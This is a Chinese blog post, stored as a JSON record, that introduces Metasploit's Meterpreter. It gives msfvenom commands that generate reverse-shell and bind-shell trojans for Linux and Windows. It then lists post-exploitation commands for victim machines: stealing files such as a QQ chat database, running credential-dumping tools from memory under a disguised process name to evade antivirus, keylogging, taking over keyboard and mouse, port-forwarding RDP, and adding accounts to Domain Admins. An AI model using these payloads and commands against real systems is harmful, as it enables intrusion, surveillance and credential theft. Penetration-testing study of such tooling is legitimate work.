{"title":"初识 Meterpreter","slug":"初识Meterpreter","date":"2020-05-25","updated":"2020-09-10","comments":true,"path":"api/posts/53615.json","excerpt":null,"cover":null,"covers":null,"content":"<h2 id=\"什么是 Meterpreter\"><a href=\"# 什么是 Meterpreter\" class=\"headerlink\" title=\"什么是 Meterpreter\"></a>什么是 Meterpreter</h2><p>metrepreter 是 metasploit 框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个 meterpreter shell 的链接。</p>\n<blockquote>\n<p>meterpreter shell 作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开 shell、得到用户密码、上传下载远程主机文件、运行 cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip 地址等信息。<br>Meterpreter 能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件<br>Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型 payload，此工具基于内存 DLL 注入理念实现，通过创建一个新进程并调用注入的 DLL 来让目标系统运行注入的 DLL 文件。攻击者与目标设备中 Meterpreter 的通信是通过 Stager 套接字实现。</p>\n</blockquote>\n<h2 id=\"Meterpreter 中常用反弹类型\"><a href=\"#Meterpreter 中常用反弹类型\" class=\"headerlink\" title=\"Meterpreter 中常用反弹类型\"></a>Meterpreter 中常用反弹类型 </h2><h3 id=\"1-reverse-tcp\"><a href=\"#1-reverse-tcp\" class=\"headerlink\" title=\"1.reverse_tcp\"></a>1.reverse_tcp</h3><p> 基于 TCP 的反向链接反弹 shell，使用稳定。</p>\n<ul>\n<li><p>Linux:</p>\n<ul>\n<li>linux 下反弹 shell 木马：</li>\n<li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell</code></li>\n<li>目录下生成木马文件 isshell，为文件加可执行权限，打开 metasploit，使用模块 handler 设置 payload(与生成木马所使用 payload 一致)</li>\n<li>设置地址和端口，开始监听。</li>\n<li>运行反弹 shell 木马，成功反弹回 shell</li>\n</ul>\n</li>\n<li><p>Windows:</p>\n<ul>\n<li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的 ip] lport=[端口] -f exe -o [要生成的文件名]</code></li>\n<li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"2-reverse-http\"><a href=\"#2-reverse-http\" class=\"headerlink\" title=\"2.reverse_http\"></a>2.reverse_http</h3><p>基于 http 方式的反向连接，网速慢的情况下不稳定。</p>\n<p><code>payload: /windows/meterpreter/reverse_http</code></p>\n<h3 id=\"3-reverse-https\"><a href=\"#3-reverse-https\" class=\"headerlink\" title=\"3.reverse_https\"></a>3.reverse_https</h3><p>基于 https 方式的反向连接，网速慢的情况下不稳定，https 若反弹没收到数据，可以将监听端口换成 443 试试。</p>\n<p><code>payload: /windows/meterpreter/reverse_https</code></p>\n<h3 id=\"4-bind-tcp\"><a href=\"#4-bind-tcp\" class=\"headerlink\" title=\"4.bind_tcp\"></a>4.bind_tcp</h3><p>基于 TCP 的正向连接 shell，一般在内网使用，不需要设置 LHOST。</p>\n<p><code>msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell</code></p>\n<p>加权运行。</p>\n<h2 id=\"Meterpreter- 常用命令\"><a href=\"#Meterpreter- 常用命令\" class=\"headerlink\" title=\"Meterpreter 常用命令\"></a>Meterpreter 常用命令</h2><p>###1. 基本命令</p>\n<ul>\n<li><p>help –查看 Meterpreter 帮助</p>\n</li>\n<li><p>background –返回，把 meterpreter 后台挂起</p>\n</li>\n<li><p>bgkill –杀死一个背景 meterpreter 脚本</p>\n</li>\n<li><p>bglist –提供所有正在运行的后台脚本的列表</p>\n</li>\n<li><p>bgrun –作为一个后台线程运行脚本</p>\n</li>\n<li><p>channel –显示活动频道</p>\n</li>\n<li><p>sessions -i number  –与会话进行交互，number 表示第 n 个 session, 使用 session -i 连接到指定序号的 meterpreter 会话已继续利用</p>\n</li>\n<li><p>sesssions -k  number  –与会话进行交互</p>\n</li>\n<li><p>close –关闭通道</p>\n</li>\n<li><p>exit –终止 meterpreter 会话</p>\n</li>\n<li><p>quit –终止 meterpreter 会话</p>\n</li>\n<li><p>interact id  –切换进一个信道</p>\n</li>\n<li><p>run –执行一个已有的模块，这里要说的是输入 run 后按两下 tab，会列出所有的已有的脚本，常用的有 autoroute,hashdump,arp_scanner,multi_meter_inject 等</p>\n</li>\n<li><p>irb –进入 Ruby 脚本模式</p>\n</li>\n<li><p>read –从通道读取数据</p>\n</li>\n<li><p>write –将数据写入到一个通道</p>\n</li>\n<li><p>run 和 bgrun –前台和后台执行以后它选定的 meterpreter 脚本</p>\n</li>\n<li><p>use –加载 meterpreter 的扩展</p>\n</li>\n<li><p>load/use –加载模块</p>\n</li>\n<li><p>Resource –执行一个已有的 rc 脚本</p>\n<h3 id=\"2- 文件系统命令\"><a href=\"#2- 文件系统命令\" class=\"headerlink\" title=\"2. 文件系统命令\"></a>2. 文件系统命令</h3></li>\n<li><p>cat c:\\boot.ini –查看文件内容, 文件必须存在</p>\n</li>\n<li><p>del c:\\boot.ini –删除指定的文件</p>\n</li>\n<li><p>upload /root/Desktop/netcat.exe c:\\  –上传文件到目标机主上，如 upload  setup.exe C:\\windows\\system32\\</p>\n</li>\n<li><p>download nimeia.txt /root/Desktop/   –下载文件到本机上如：download C:\\boot.ini /root/ 或者 download C:\\“ProgramFiles”\\Tencent\\QQ\\Users\\295<strong>**</strong>125\\Msg2.0.db /root/</p>\n</li>\n<li><p>edit c:\\boot.ini   –编辑文件</p>\n</li>\n<li><p>getlwd –打印本地目录</p>\n</li>\n<li><p>getwd –打印工作目录</p>\n</li>\n<li><p>lcd –更改本地目录</p>\n</li>\n<li><p>ls –列出在当前目录中的文件列表</p>\n</li>\n<li><p>lpwd –打印本地目录</p>\n</li>\n<li><p>pwd –输出工作目录</p>\n</li>\n<li><p>cd c:\\  –进入目录文件下</p>\n</li>\n<li><p>rm file  –删除文件</p>\n</li>\n<li><p>mkdir dier  –在受害者系统上的创建目录</p>\n</li>\n<li><p>rmdir –受害者系统上删除目录</p>\n</li>\n<li><p>dir –列出目标主机的文件和文件夹信息</p>\n</li>\n<li><p>mv –修改目标主机上的文件名</p>\n</li>\n<li><p>search -d d:\\www -f web.config  –search 文件，如 search  -d c:\\  -f*.doc</p>\n</li>\n<li><p>meterpreter &gt; search -f autoexec.bat   –搜索文件</p>\n</li>\n<li><p>meterpreter &gt; search -f sea*.bat c:\\xamp\\</p>\n</li>\n<li><p>enumdesktops      –用户登录数</p>\n</li>\n<li><p>下载文件: 使用命令“download +file path”, 将下载目标机器的相对应权限的任何路径下的文件</p>\n</li>\n<li><p>上传文件: upload 命令为上传文件到我们的目标机器</p>\n</li>\n<li><p>查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。</p>\n</li>\n<li><p>切换、查询当前路径: pwd 命令将查询当前在 dos 命令下的路径，“cd”命令可以改变当前路径</p>\n</li>\n<li><p>sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是 windows XP service pack 2，sp2 这个系统有很多漏洞。</p>\n</li>\n<li><p>execute 命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f 为执行要运行的命令</p>\n<ul>\n<li>如果希望隐藏后台执行，加参数 -H <code>execute  -H -f notepad.exe</code></li>\n<li>我们运行目标主机上的 cmd.exe 程序，并以隐藏的方式直接交互到我们的 meterpreter 会话上 <code>execute  -H -i -f cmd.exe</code></li>\n<li>在目标主机内存中直接执行我们攻击主机上的攻击程序，比如 wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀  <code>execute  -H -m -d notepad.exe-f  wce.exe -a &quot;-o wce.txt&quot;</code><ul>\n<li>-d 在目标主机执行时显示的进程名称（用以伪装）</li>\n<li>-m 直接从内存中执行</li>\n<li>-o wce.txt 是 wce.exe 的运行参数</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>idletime 命令: 为显示目标机器截止到当前无操作命令的时间</p>\n</li>\n<li><p>search 命令: 在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用 <code>search –h</code> 命令来查看 search 命令的帮助信息</p>\n</li>\n<li><p>edit 命令: 调用 vi 编辑器，对目标主机上的文件修改</p>\n<h3 id=\"3- 网络命令\"><a href=\"#3- 网络命令\" class=\"headerlink\" title=\"3. 网络命令\"></a>3. 网络命令</h3></li>\n<li><p>ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址</p>\n</li>\n<li><p>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  –端口转发, 本机监听 4444, 把目标机 3389 转到本机 4444</p>\n</li>\n<li><p>netstat -an | grep“4444”   –查看指定端口开放情况</p>\n</li>\n<li><p>rdesktop -u Administrator -p bk#123 127.0.0.1:4444  –使用 rdesktop 来连接桌面，-u 用户名 -p 密码</p>\n</li>\n<li><p>rdesktop 127.1.1.0:4444  –需要输入用户名和密码远程连接</p>\n</li>\n<li><p>route –查看或修改受害者路由表</p>\n<ul>\n<li>route add 192.168.1.0 255.255.255.0 1  –添加动态路由</li>\n<li>route print  –路由表输出</li>\n</ul>\n</li>\n<li><p>runget_local_subnets  –目标主机的内网 IP 段情况</p>\n</li>\n<li><p>Arp       –看 ARP 缓冲表</p>\n</li>\n<li><p>Getproxy     –获取代理</p>\n</li>\n<li><p>portfwd：网络命令则有列出 ip 信息(ipconfig), 展示修改路由表(route), 还有端口转发(portfwd)。</p>\n<h3 id=\"4- 键盘监听\"><a href=\"#4- 键盘监听\" class=\"headerlink\" title=\"4. 键盘监听\"></a>4. 键盘监听</h3></li>\n<li><p>keyscan_start：开启键盘记录功能</p>\n</li>\n<li><p>keyscan_dump：显示捕捉到的键盘记录信息</p>\n</li>\n<li><p>keyscan_stop：停止键盘记录功能</p>\n</li>\n<li><p>uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。</p>\n<h3 id=\"5- 系统命令\"><a href=\"#5- 系统命令\" class=\"headerlink\" title=\"5. 系统命令\"></a>5. 系统命令</h3></li>\n<li><p>reboot –重新启动受害人的计算机</p>\n</li>\n<li><p>reg –与受害人的注册表进行交互</p>\n</li>\n<li><p>rev2self  –回到控制目标主机的初始用户账户下</p>\n</li>\n<li><p>shell –获得控制台权限</p>\n</li>\n<li><p>shutdown –关闭了受害者的计算机</p>\n</li>\n<li><p>sysinfo  –查看目标机系统信息，如机器名，操作系统等</p>\n</li>\n<li><p>add_user username password -h ip     –在远程目标主机上添加一个用户</p>\n</li>\n<li><p>add_group_user “Domain Admins” username -h ip    –将用户添加到目标主机的域管理员组中</p>\n</li>\n</ul>\n","url":"/posts/53615/","min2read":7,"word4post":"1.9k","prev_post":{"title":"攻防世界 pwn-100","url":"/posts/52788/"},"next_post":{"title":"UAF 漏洞简单学习","url":"/posts/24311/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"什么是 Meterpreter\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">什么是 Meterpreter</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"Meterpreter 中常用反弹类型\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">Meterpreter 中常用反弹类型 </span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"1-reverse-tcp\" href = \"#\"><span class=\"toc-number\">2.1.</span> <span class=\"toc-text\">1.reverse_tcp</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"2-reverse-http\" href = \"#\"><span class=\"toc-number\">2.2.</span> <span class=\"toc-text\">2.reverse_http</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"3-reverse-https\" href = \"#\"><span class=\"toc-number\">2.3.</span> <span class=\"toc-text\">3.reverse_https</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"4-bind-tcp\" href = \"#\"><span class=\"toc-number\">2.4.</span> <span class=\"toc-text\">4.bind_tcp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"Meterpreter- 常用命令\" href = \"#\"><span class=\"toc-number\">3.</span> <span class=\"toc-text\">Meterpreter 常用命令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"2- 文件系统命令\" href = \"#\"><span class=\"toc-number\">3.1.</span> <span class=\"toc-text\">2. 文件系统命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"3- 网络命令\" href = \"#\"><span class=\"toc-number\">3.2.</span> <span class=\"toc-text\">3. 网络命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"4- 键盘监听\" href = \"#\"><span class=\"toc-number\">3.3.</span> <span class=\"toc-text\">4. 键盘监听</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"5- 系统命令\" href = \"#\"><span class=\"toc-number\">3.4.</span> <span class=\"toc-text\">5. 系统命令</span></a></li></ol></li></ol>","categories":[],"tags":[{"name":"chrome","path":"api/tags/chrome.json","url":"/tags/chrome/"}]}